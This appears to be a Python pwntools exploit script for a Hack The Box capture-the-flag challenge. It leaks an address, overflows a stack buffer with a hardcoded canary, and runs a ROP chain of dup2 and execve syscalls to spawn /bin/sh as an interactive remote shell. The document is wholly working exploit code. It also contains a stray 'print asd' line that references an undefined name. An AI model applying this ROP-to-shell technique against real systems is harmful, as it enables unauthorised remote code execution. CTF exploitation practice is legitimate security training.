#!/usr/bin/env python
from pwn import *
context.log_level='critical'
r = remote('docker.hackthebox.eu', 32300)
r.recvuntil(']\n')
r.sendline('3')
r.recvline()
leak = int(r.recvline().split(' ')[-1].strip(),16)
print hex(leak)

r.sendline('2')
for i in xrange(14):
    r.recvuntil('!\n')
    #r.sendline(str(eval(r.recvline().split(' ')[0])))
    r.sendline('1')

__import__('time').sleep(10)
r.sendline('1')
#r.interactive()
r.recvuntil('name: ')
print asd
writable = 0x7ffdc9c9d570-0x80
payload = "A"*72+"007449a222c977c970d5c9c9fd7f0000".decode('hex') # padding + canary + saved rbp
payload += p64(0x55c960dbb2bb+2) #pop rax; pop rsi; ret
payload += p64(33)
payload += p64(0)
payload += p64(0x55c960dbb2bb+5) #pop rdi; pop rdx; pop rbx; ret
payload += p64(4)*3
payload += p64(0x55c960dbb2bb+0xd) #syscall ret
payload += p64(0x55c960dbb2bb+2) #pop rax; pop rsi; ret
payload += p64(33)
payload += p64(1)
payload += p64(0x55c960dbb2bb+5) #pop rdi; pop rdx; pop rbx; ret
payload += p64(4)*3
payload += p64(0x55c960dbb2bb+0xd) #syscall ret
payload += p64(0x55c960dbb2bb+2) #pop rax; pop rsi; ret
payload += p64(59) # execve syscall number
payload += p64(0) # argv for execve
payload += p64(0x55c960dbb2bb+5) #pop rdi; pop rdx; pop rbx; ret
payload += p64(writable) # addr for /bin/sh
payload += p64(0) #rdx null
payload += p64(0x68732f6e69622f) # /bin/sh to write to address on rdi
payload += p64(0x55c960dbb2bb+9) # mov QWORD PTR [rdi],rbx; ret
    
payload += p64(0x55c960dbb2bb+0xd) #syscall ret
r.send(payload)

#+p64(0x55c960dbb2bb+5)+p64(writable)+p64(0)+p64(0x68732f6e69622f)+p64(0x55c960dbb2ce)) #p64(0x55c960dbb2bb+0xd))
r.recvuntil(']\n')
r.sendline('1')
#r.recvuntil('Dump of')
#print r.recvline()
#print r.recv().encode('hex')
r.interactive()
